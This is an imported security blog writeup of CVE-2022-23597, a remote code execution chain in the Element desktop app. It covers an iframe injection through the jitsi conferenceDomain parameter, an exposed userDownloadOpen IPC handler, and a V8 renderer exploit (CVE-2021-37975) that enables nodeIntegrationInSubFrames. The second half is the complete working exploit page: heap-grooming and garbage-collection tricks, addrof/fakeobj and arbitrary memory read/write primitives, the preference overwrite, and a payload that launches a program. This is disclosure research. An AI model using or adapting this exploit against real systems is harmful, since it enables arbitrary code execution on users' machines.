---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-13_remote-code-execution-on-element-desktop-application-using-node-integration-in-s.md
original_filename: 2022-08-13_remote-code-execution-on-element-desktop-application-using-node-integration-in-s.md
title: Remote Code Execution on Element Desktop Application using Node Integration
  in Sub Frames Bypass - CVE-2022-23597
category: documents
detected_topics:
- command-injection
- xss
- race-condition
- api-security
tags:
- imported
- documents
- command-injection
- xss
- race-condition
- api-security
language: en
raw_sha256: 76e1004740ef6a943b48a1791b731aa468e92fe33b8034053647270c44312a54
text_sha256: 6b32396345e5dbad7bd77ce003610b11a40dec0a684bb75e5a7880f7348b5807
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-13_remote-code-execution-on-element-desktop-application-using-node-integration-in-s.md
- Source Type: markdown
- Detected Topics: command-injection, xss, race-condition, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `76e1004740ef6a943b48a1791b731aa468e92fe33b8034053647270c44312a54`
- Text SHA256: `6b32396345e5dbad7bd77ce003610b11a40dec0a684bb75e5a7880f7348b5807`


## Content

---
title: "Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597"
page_title: "Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597 | Electrovolt Blog"
url: "https://blog.electrovolt.io/posts/element-rce/"
final_url: "https://blog.electrovolt.io/posts/element-rce/"
authors: ["s1r1us (@s1r1u5_)", "Maxwell Garrett (@TheGrandPew)"]
programs: ["Matrix (Element)"]
bugs: ["RCE", "XSS"]
publication_date: "2022-08-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2315
---

#  Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597 

2022-08-13

| [Home](/)

– by [s1r1us](https://twitter.com/S1r1u5_) and [TheGrandPew](https://twitter.com/TheGrandPew)

![pew 1: element](/img/element.png)

During our Electron Desktop Application hacking frenzy, Pew informed me on Discord about a Desktop Application called Element in which he was able to insert an external iframe. We began examining the Element source code, which is public [here](https://github.com/vector-im/element-desktop), and eventually succeeded in Remote Code Execution.

Let’s dig into the details of the bug right away!

### Bug #1: IFrame Injection

This is rather a feature than a bug, Element supports [jitsi](https://github.com/vector-im/element-web/blob/36f8a37bd4f6b38b174c2bc83147bfad66850122/docs/jitsi.md) for conference calls, which provides options for self-hosting your own server. According to docs, `conferenceDomain` query parameter can be provided to embed an self-hosting conference server. Furthermore, the doc says `The url is typically something we shove into an iframe with "sandboxing"`. As, it was “sandboxed” it won’t be an issue right? right?

#### PoC for Iframe Injection

The following URL can be used to embed an external site named `pwn.af`.
  
  
  https://app.element.io/jitsi.html?conferenceDomain=pwn.af&conferenceId=xxd&userId=pew
  

##### Desktop Application PoC:
  
  
  element://vector/webapp/jitsi.html?conferenceDomain=pwn.af&conferenceId=xxd&userId=pew
  

By using the above PoC, we can get JavaScript Execution on the Desktop App. The issue is Element Desktop Applicaiton fully enables sandbox. As you can noticed in the below script sandbox is enabled via `app.enableSandbox()`, also note that [`nodeIntegrationInSubFrames`](https://www.electronjs.org/docs/latest/api/browser-window#:~:text=nodeIntegrationInSubFrames) is not explicitly enabled which is disabled by default.
  
  
  1  app.enableSandbox();
  2  global.mainWindow = new BrowserWindow({
  3  [...]
  4  webPreferences: {
  5  preload: preloadScript,
  6  nodeIntegration: false,
  7  //sandbox: true, // We enable sandboxing from app.enableSandbox() above
  8  contextIsolation: true,
  9  webgl: true,
  10  },
  

This situation is different from previous [Discord](https://blog.electrovolt.io/posts/discord-rce/) bug where sandbox is not fully enabled. There are few things we can look for, if sandbox is disabled on main window.

  1. Check if there are any `new-window` or `navigation` misconfiguration similar to [Discord](https://blog.electrovolt.io/posts/discord-rce/) bug.
  2. Check if there are any `postMessage` issues on main frame.
  3. Find a XSS on subdomain of the parent window(app.element.io). To perform `same-origin` spoofing similar to the [challenge](https://blog.s1r1us.ninja/CTF/bsidesahm2021) I gave in BSides Ahmedabad CTF.
  4. Finally, we can look for sensitive `ipcMain` handlers on main window which can be reached through [CVE-2022-29247](https://blog.electrovolt.io/posts/electron/) we reported to Electron

Now, the only option we have is four as the app is fully sandboxed.

### Bug? #2: Finding Remote Code Execution Sinks on Desktop App

After grepping for `ipcMain.on` and `ipcMain.handle` we came across to an interesting IPC handler defined to open user Downloaded files.
  
  
  1//https://github.com/vector-im/element-desktop/blob/53e7100033a9c9283f79bb3a4c5070a461709631/src/webcontents-handler.ts#L248
  2ipcMain.on('userDownloadOpen', function(ev: IpcMainEvent, { path }) {
  3  shell.openPath(path);
  4});
  

And, this is exposed to Main Window parent frame using preload scripts [contextBridge](https://www.electronjs.org/docs/latest/api/context-bridge) as below.
  
  
  1contextBridge.exposeInMainWorld(
  2  "electron",
  3  {
  4  on(channel: string, listener: (event: IpcRendererEvent, ...args: any[]) => void): void {
  5  if (!CHANNELS.includes(channel)) {
  6  console.error(`Unknown IPC channel ${channel} ignored`);
  7  return;
  8  }
  9  ipcRenderer.on(channel, listener);
  10  },
  11  send(channel: string, ...args: any[]): void {
  12  if (!CHANNELS.includes(channel)) {
  13  console.error(`Unknown IPC channel ${channel} ignored`);
  14  return;
  15  }
  16  ipcRenderer.send(channel, ...args);
  17  },
  18  },
  19);
  

So, by sending an following IPC from the main frame, we can achieve Remote Code Execution on Element Desktop.
  
  
  1electron.send('userDownloadOpen',{path:'C:\\Windows\\System32\\calc.exe'})
  

Now, Let’s consider our options on how to get access to `electron.send` from the iframe which we have XSS on.

  1. Get an XSS on Main window and access `electron.send` directly.
  2. Use [CVE-2022-29247](https://blog.electrovolt.io/posts/electron/) nodeIntegrationInSubFrames and get access to `electron.send` in our iframe.

We audited Main Window JavaScript for XSS sinks, we couldn’t find anything interesting. So, we decided to use second option which seems to be easily achieved as the Element Desktop is using an old version of Electron.
  
  
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Element/1.9.5 Chrome/91.0.4472.164 Electron/13.5.1 Safari/537.36
  

### What is nodeIntegrationInSubFrames?

It is important to understand what `nodeIntegrationSubFrames` is clearly, from the official Electron Documentation the `nodeIntegrationInSubFrames` `webPreference` is defined as follows.

_nodeIntegrationInSubFrames: Experimental option for enabling Node.js support in sub-frames such as iframes and child windows. All your preloads will load for every iframe, you can use process.isMainFrame to determine if you are in the main frame or not._

The important thing to note in the above statement for our exploit is that the `nodeIntegrationSubFrames` enables preloads in iframes, in other words it exposes `contextBridge` APIs to the iframes and child windows. Which is what we exactly wanted to get access to `electron.send` exposed by the Element Desktop Main window preload JS.

The situation we have can be described with the below picture.

![Node Integration in Sub Frames](/img/nisf.png)

As you, can see our frame doesn’t have access to `electron.send` API.

### Bug 3: Renderer Exploit to Enable nodeIntegrationInSubFrames [CVE-2022-29247](https://blog.electrovolt.io/posts/electron/)

Electron adds Electron-specific WebPreferences such as `node_integration`, `context_isolation` and `node_integration_in_subframes` by patching the blink `WebPreferences`. These preferences then later used to check if the specific `RenderFrame`(a web frame) has access to Electron specific features such Node APIs, preload scripts, contextBridge and so on.
  
  
  1--- a/third_party/blink/common/web_preferences/web_preferences.cc
  2+++ b/third_party/blink/common/web_preferences/web_preferences.cc
  3@@ -142,6 +142,19 @@ WebPreferences::WebPreferences()
  4  fake_no_alloc_direct_call_for_testing_enabled(false),
  5  v8_cache_options(blink::mojom::V8CacheOptions::kDefault),
  6  record_whole_document(false),
  7+  // Begin Electron-specific WebPreferences.
  8+  context_isolation(false),
  9+  is_webview(false),
  10+  hidden_page(false),
  11+  offscreen(false),
  12+  node_integration(false),
  13+  node_integration_in_worker(false),
  14+  node_integration_in_sub_frames(false),
  15+  enable_spellcheck(false),
  16+  enable_plugins(false),
  17+  enable_websql(false),
  18+  webview_tag(false),
  19+  // End Electron-specific WebPreferences.
  20  cookie_enabled(true),
  21  accelerated_video_decode_enabled(false),
  22  animation_policy(
  

Let’s just concentrate on `node_integration_in_sub_frames` which is needed for our Element RCE, the other WebPreferences exploitations will be described in coming blogs.

The decision to either allow preloads in child frames(`RenderFrame`s) takes place in `ElectronRenderFrameObserver:DidInstallConditionalFeatures` which is done in the same Renderer process instead of the Browser process.
  
  
  1void ElectronSandboxedRendererClient::DidCreateScriptContext(
  2  v8::Handle<v8::Context> context,
  3  content::RenderFrame* render_frame) {
  4  RendererClientBase::DidCreateScriptContext(context, render_frame);
  5
  6  // Only allow preload for the main frame or
  7  // For devtools we still want to run the preload_bundle script
  8  // Or when nodeSupport is explicitly enabled in sub frames
  9  bool is_main_frame = render_frame->IsMainFrame();
  10  bool is_devtools =
  11  IsDevTools(render_frame) || IsDevToolsExtension(render_frame);
  12  bool allow_node_in_sub_frames =
  13  render_frame->GetBlinkPreferences().node_integration_in_sub_frames;
  14  bool should_load_preload =
  15  (is_main_frame || is_devtools || allow_node_in_sub_frames) &&
  16  !IsWebViewFrame(context, render_frame);
  17  if (!should_load_preload)
  18  return;
  19
  20  injected_frames_.insert(render_frame);
  21[...]
  22}
  

As the check is done in the renderer process, using a renderer exploit the setting can be flipped which effectively enables `nodeIntegrationInSubFrames`.

The only thing which is left is to write an exploit which flips the `render_frame->GetBlinkPreferences().node_integration_in_sub_frames` somehow which is the hardest part for me.

### Exploit Development with v8 exploit CVE-2021-37975

I decided to use [CVE-2021-37975](https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE-2021-37975) to exploit the issue. Having not so much experience in exploit development, this was the very tiring and interesting part for me. Fun fact, I didn’t know nothing about v8 binary exploitation before our research and somehow was able to learn basic v8 exploitation thanks to my CTF mate ptr-yudai 😌. Even though, we usually use an public v8 exploit its not as easy as running it and popping the calculator. The hardest part I faced during this exploit writing is finding `render_frame_` offset from `window` object as it was not stable usually because of using hardcoded offsets dumbly. I used to spend days in `lldb` to understand the v8 bug and find offsets to blink WebPreferences, but the popping calculator in the end made it worth doing.

Anywho, after trying for 2 days I was able to pull off full exploit. The following snippet shows the offset to `render_frame->GetBlinkPreferences().node_integration_in_sub_frames`. You can find the full exploit in the end of the writeup.
  
  
  1  var win = addrof(window);
  2  console.log("[+] win address : " + win.hex());
  3
  4  var addr1 = half_read(win + 0x18n);
  5  console.log("[+] win + 0x18 : " + addr1.hex());
  6
  7  var addr2 = full_read(addr1 + 0xf8n);
  8  console.log("[+] add2: " + addr2.hex());
  9
  10  var web_pref = addr2 + 0x50008n;
  11  var preload = full_read(web_pref + 0x1a0n);
  12  console.log("[+] web_pref addr: " + web_pref.hex());
  13
  14
  15  var nisf = web_pref  + 0x1acn;
  16  var nisf_val = full_read(nisf);
  17  console.log("[+] nisf val = "+ nisf_val.hex());
  18  var overwrite = nisf_val | 0x0000000000000001n //overwrite
  19  full_write(nisf, overwrite);
  20  var nisf_val = full_read(nisf);
  21  console.log("[+] nisf val overwritten = "+ nisf_val.hex());
  

And finally, after enabling the nodeIntegrationInSubFrames we just need to create a same-origin `RenderFrame` which will have access to `electron.send` 🔥.
  
  
  1  frame = document.createElement("iframe")
  2  frame.srcdoc="<script>electron.send('userDownloadOpen',{path:'/System/Applications/Calculator.app/Contents/MacOS/Calculator'})<\/script>";
  3  document.body.appendChild(frame)
  

### PoC

The final exploit looks like as below.

![final](/img/nisf_main.png)

Here is the nice PoC which pop the calculator. 

### “Want to secure your electron or JS Application. Reach out us at [hello@electrovolt.io](mailto:hello@electrovolt.io) or visit <https://electrovolt.io> to learn more”

Here is the full exploit to get RCE on Element.
  
  
  1<html>
  2<head></head>
  3<b>pwn</b>
  4<button onclick=pwn() >click me to pwn </button>
  5<script>
  6  function sleep(miliseconds) {
  7  var currentTime = new Date().getTime();
  8  while (currentTime + miliseconds >= new Date().getTime()) {
  9  }
  10}
  11
  12var initKey = {init : 1};
  13var level = 4;
  14var map1 = new WeakMap();
  15var gcSize = 0x4fe00000;
  16var sprayParam = 100;
  17
  18var dbl = [1.1,1.1,1.1,1.1];
  19// %DebugPrint(dbl);
  20
  21//Get mapAddr using DebugPrint for double array (the compressed address of the map)
  22// var mapAddr = 0x824a8e1;
  23// var mapAddr = 0x82830e1
  24var mapAddr = 0x83430e1
  25
  26var rwxOffset = 0x60;
  27
  28var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
  29var module = new WebAssembly.Module(code);
  30var instance = new WebAssembly.Instance(module);
  31var wasmMain = instance.exports.main;
  32// %DebugPrint(instance);
  33//Return values should be deleted/out of scope when gc happen, so they are not directly reachable in gc
  34function hideWeakMap(map, level, initKey) {
  35  let prevMap = map;
  36  let prevKey = initKey;
  37  for (let i = 0; i < level; i++) {
  38  let thisMap = new WeakMap();
  39  prevMap.set(prevKey, thisMap);
  40  let thisKey = {'h' : i};
  41  //make thisKey reachable via prevKey
  42  thisMap.set(prevKey, thisKey);
  43  prevMap = thisMap;
  44  prevKey = thisKey;
  45  if (i == level - 1) {
  46  let retMap = new WeakMap();
  47  map.set(thisKey, retMap);
  48  return thisKey;
  49  }
  50  }
  51}
  52//Get the key for the hidden map, the return key is reachable as strong ref via weak maps, but should not be directly reachable when gc happens
  53function getHiddenKey(map, level, initKey) {
  54  let prevMap = map;
  55  let prevKey = initKey;
  56  for (let i = 0; i < level; i++) {
  57  let thisMap = prevMap.get(prevKey);
  58  let thisKey = thisMap.get(prevKey);
  59  prevMap = thisMap;
  60  prevKey = thisKey;
  61  if (i == level - 1) {
  62  return thisKey;
  63  }
  64  }
  65}
  66
  67function setUpWeakMap(map) {
  68//  for (let i = 0; i < 1000; i++) new Array(300);
  69  //Create deep enough weak ref trees to hiddenMap so it doesn't get discovered by concurrent marking
  70  let hk = hideWeakMap(map, level, initKey);
  71//Round 1 maps
  72  let hiddenMap = map.get(hk);
  73  let map7 = new WeakMap();
  74  let map8 = new WeakMap();
  75
  76//hk->k5, k5: discover->wl
  77  let k5 = {k5 : 1};
  78  let map5 = new WeakMap();
  79  let k7 = {k7 : 1};
  80  let k9 = {k9 : 1};
  81  let k8 = {k8 : 1};
  82  let ta = new Uint8Array(1024);
  83  ta.fill(0xfe);
  84  let larr = new Array(1 << 15);
  85  larr.fill(1.1);
  86  let v9 = {ta : ta, larr : larr};
  87  map.set(k7, map7);
  88  map.set(k9, v9);
  89
  90//map3 : kb|vb: initial discovery ->wl
  91  hiddenMap.set(k5, map5);
  92  hiddenMap.set(hk, k5);
  93
  94//iter2: wl: discover map5, mark v6 (->k5) black, discovery: k5 black -> wl
  95//iter3: wl: map5 : mark map7, k7, no discovery, iter end
  96  map5.set(hk, k7);
  97  
  98//Round 2: map5 becomes kb in current, initial state: k7, map7 (black), goes into wl
  99//iter1
  100
  101//wl discovers map8, and mark k8 black
  102  map7.set(k8, map8);
  103  map7.set(k7, k8);
  104
  105//discovery moves k8, map8 into wl
  106//iter2 marks k9 black, iter finished
  107  map8.set(k8,k9);
  108  
  109}
  110
  111
  112var conversion_buffer = new ArrayBuffer(8);
  113var float_view = new Float64Array(conversion_buffer);
  114var int_view = new BigUint64Array(conversion_buffer);
  115BigInt.prototype.hex = function() {
  116  return '0x' + this.toString(16);
  117};
  118BigInt.prototype.i2f = function() {
  119  int_view[0] = this;
  120  return float_view[0];
  121}
  122Number.prototype.f2i = function() {
  123  float_view[0] = this;
  124  return int_view[0];
  125}
  126
  127
  128
  129var view = new ArrayBuffer(24);
  130var dblArr = new Float64Array(view);
  131var intView = new Int32Array(view);
  132var bigIntView = new BigInt64Array(view);
  133
  134function ftoi32(f) {
  135  dblArr[0] = f;
  136  return [intView[0], intView[1]];
  137}
  138
  139function i32tof(i1, i2) {
  140  intView[0] = i1;
  141  intView[1] = i2;
  142  return dblArr[0];
  143}
  144
  145function itof(i) {
  146  bigIntView = BigInt(i);
  147  return dblArr[0];
  148}
  149
  150function ftoi(f) {
  151  dblArr[0] = f;
  152  return bigIntView[0];
  153}
  154
  155BigInt.prototype.hex = function() {
  156  return '0x' + this.toString(16);
  157};
  158
  159Number.prototype.hex = function() {
  160  return '0x' + this.toString(16);
  161};
  162
  163function gc() {
  164  //trigger major GC: See https://tiszka.com/blog/CVE_2021_21225_exploit.html (Trick #2: Triggering Major GC without spraying the heap)
  165  new ArrayBuffer(gcSize);
  166}
  167
  168
  169function restart() {
  170  //Should deopt main if it gets optimized
  171  global.__proto__ = {};
  172  gc();
  173  sleep(2000);
  174  pwn();
  175}
  176
  177function pwn() {
  178	setUpWeakMap(map1);
  179	gc();
  180
  181	let objArr = [];
  182
  183	for (let i = 0; i < sprayParam; i++) {
  184  let thisArr = new Array(1 << 15);
  185  objArr.push(thisArr);
  186	}
  187	//These are there to stop main being optimized by JIT
  188  globalIdx['a' + globalIdx] = 1;
  189  //Can't refactor this, looks like it cause some double rounding problem (got optimized?)
  190	for (let i = 0; i < objArr.length; i++) {
  191  let thisArr = objArr[i];
  192  thisArr.fill(instance);
  193	}
  194  globalIdx['a' + globalIdx + 1000] = 1;
  195  let result = null;
  196	try {
  197  result = fetch();
  198  } catch (e) {
  199  console.log("fetch failed");
  200  restart();
  201  return;
  202  }
  203  if (!result) {
  204  console.log("fail to find object address.");
  205  restart();
  206  return;
  207  }
  208  let larr = result.larr;
  209  let index = result.idx;
  210
  211  let instanceAddr = ftoi32(larr[index])[0];
  212  let instanceFloatAddr = larr[index];
  213  console.log("found instance address: 0x" + instanceAddr.toString(16) + " at index: " + index);
  214  let x = {};
  215  for (let i = 0; i < objArr.length; i++) {
  216  let thisArr = objArr[i];
  217  thisArr.fill(x);
  218  }
  219
  220  globalIdx['a' + globalIdx + 5000] = 1;
  221
  222  larr[index] = instanceFloatAddr;
  223  let objArrIdx = -1;
  224  let thisArrIdx = -1;
  225  for (let i = 0; i < objArr.length; i++) {
  226  globalIdx['a' + globalIdx + 3000] = 1;
  227  global.__proto__ = {};
  228  let thisArr = objArr[i];
  229  for (let j = 0; j < thisArr.length; j++) {
  230  let thisObj = thisArr[j];
  231  if (thisObj == instance) {
  232  console.log("found window object at: " + i + " index: " + j);
  233  objArrIdx = i;
  234  thisArrIdx = j;
  235  }
  236  }
  237  }
  238  globalIdx['a' + globalIdx + 4000] = 1;
  239  if (objArrIdx == -1) {
  240  console.log("failed getting fake object index.");
  241  restart();
  242  return;
  243  }
  244  let obj_arr = objArr[objArrIdx];
  245  let double_arr = larr;
  246
  247  //%DebugPrint(objArr[objArrIdx][thisArrIdx]);
  248
  249  function addrof(obj){
  250  
  251  obj_arr.fill(obj);  
  252  return (double_arr[index].f2i() & 0xffffffffn) - 1n;
  253
  254  }
  255
  256  function fakeobj(addr){
  257  globalIdx['a' + globalIdx + 2001] = 1;
  258
  259  larr[index] =  addr 
  260  return objArr[objArrIdx][thisArrIdx];
  261
  262  }
  263
  264  globalIdx['a' + globalIdx + 2000] = 1;
  265
  266
  267  // Fake map
  268  let addr_proto = addrof(Array.prototype);
  269  console.log("[+] addr_proto = " + addr_proto.hex());
  270  let fake_map = [
  271  0x1604040408042119n.i2f(),
  272  0x0a0004002100043dn.i2f(),
  273  (addr_proto | 1n).i2f()
  274  ];
  275
  276  //%DebugPrint(fake_map);
  277  let addr_map = addrof(fake_map) + 0x74n;
  278  if((addr_map%8n)!=0)
  279  addr_map -= 4n //for some reason it should %8 = 0
  280  console.log("[+] fake map: " + addr_map.hex());
  281  
  282  let obj = [1.1,1.1,1.1];
  283  //%DebugPrint(obj);
  284
  285  let addr  = Number(addrof(obj)) | 1 ;
  286
  287  let objEleAddr = addr + 0x18 + 0x8 ;
  288  let floatAddr = i32tof(objEleAddr, objEleAddr);
  289  let floatMapAddr = i32tof(Number(addr_map) | 1, Number(addr_map) | 1);
  290  //Faking an array at using obj[0] and obj[1]
  291  obj[0]  = floatMapAddr;
  292  // let eleLength = i32tof(instanceAddr + rwxOffset, 10);
  293  //fake object at element of obj
  294  larr[index] = floatAddr;
  295  let fakeArray = objArr[objArrIdx][thisArrIdx];
  296
  297  function half_read(addr){
  298  // let element = i32tof(addr-8, 10);//-8 exact addr
  299  let element = (0x888800000001n | (addr-8n)).i2f();
  300  obj[1] = element;
  301  return fakeArray[0].f2i();
  302
  303  }
  304  function half_write(addr, value){
  305
  306  // let element  = i32tof(addr-8, 10);
  307  let element = (0x888800000001n | (addr-8n)).i2f();
  308  obj[1] = element;
  309  fakeArray[0] = value.i2f();
  310  }
  311
  312  //full read write
  313  let evil = new Float64Array(0x10);
  314  let addr_evil = addrof(evil);
  315  console.log("[+] addr_evil = " + addr_evil.hex());
  316  let orig_evil = half_read(addr_evil + 0x28n);
  317  console.log("[+] backing store of typed array: " + orig_evil.hex());
  318  function full_read(addr) {
  319  half_write(addr_evil + 0x28n, addr);
  320  return evil[0].f2i();
  321  }
  322  function full_write(addr, value) {
  323  half_write(addr_evil + 0x28n, addr);
  324  evil[0] = value.i2f();
  325  }
  326  function full_cleanup() {
  327  half_write(addr_evil + 0x28n, orig_evil);
  328  }
  329
  330  var win = addrof(window);
  331  console.log("[+] win address : " + win.hex());
  332
  333  var addr1 = half_read(win + 0x18n);
  334  console.log("[+] win + 0x18 : " + addr1.hex());
  335
  336  var addr2 = full_read(addr1 + 0xf8n);
  337  console.log("[+] add2: " + addr2.hex());
  338
  339  var web_pref = addr2 + 0x50008n;
  340  var preload = full_read(web_pref + 0x1a0n);
  341  console.log("[+] web_pref addr: " + web_pref.hex());
  342
  343  console.log("[+] preload addr: " + preload.hex());
  344
  345  var ciso = web_pref + 0x184n
  346  var nisf = web_pref  + 0x1acn;
  347  var nisf_val = full_read(nisf);
  348  console.log("[+] nisf val = "+ nisf_val.hex());
  349  var overwrite = nisf_val | 0x0000000000000001n
  350  full_write(nisf, overwrite);
  351  var nisf_val = full_read(nisf);
  352  console.log("[+] nisf val overwritten = "+ nisf_val.hex());
  353
  354  // var ciso_val = full_read(ciso);
  355  // console.log("[+] ciso val = "+ ciso_val.hex());
  356  // var overwrite = ciso_val  &  (0xffffffffffffff00n);
  357  // full_write(ciso, overwrite);
  358  // var nisf_val = full_read(ciso);
  359  // console.log("[+] ciso val overwritten = "+ ciso_val.hex());
  360
  361
  362
  363
  364  frame = document.createElement("iframe")
  365  frame.srcdoc="<script>electron.send('userDownloadOpen',{path:'/System/Applications/Calculator.app/Contents/MacOS/Calculator'})<\/script>";
  366  document.body.appendChild(frame)
  367
  368}
  369
  370function findTA(ta) {
  371  let found = false;
  372  for (let i = 0; i < 16; i++) {
  373  if (ta[i] != 0xfe) {
  374  console.log(ta[i]);
  375  return true;
  376  }
  377  }
  378  console.log(ta[0]);
  379  return found;
  380}
  381
  382function findLArr(larr) {
  383  for (let i = 0; i < (1 << 15); i++) {
  384  if (larr[i] != 1.1) {
  385  let addr = ftoi32(larr[i]);
  386  return i;
  387  }
  388	}
  389	return -1;
  390}
  391
  392function fetch() {
  393	let hiddenKey = getHiddenKey(map1, level, initKey);
  394	let hiddenMap = map1.get(hiddenKey);
  395	let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
  396	let k8 = map1.get(k7).get(k7);
  397	let map8 = map1.get(k7).get(k8);
  398
  399	let larr = map1.get(map8.get(k8)).larr;
  400  let index = findLArr(larr);
  401	if (index == -1) {
  402  return;
  403	}
  404  return {larr : larr, idx : index};
  405}
  406global = {};
  407globalIdx = 0;
  408pwn();
  409</script>
  410</html>
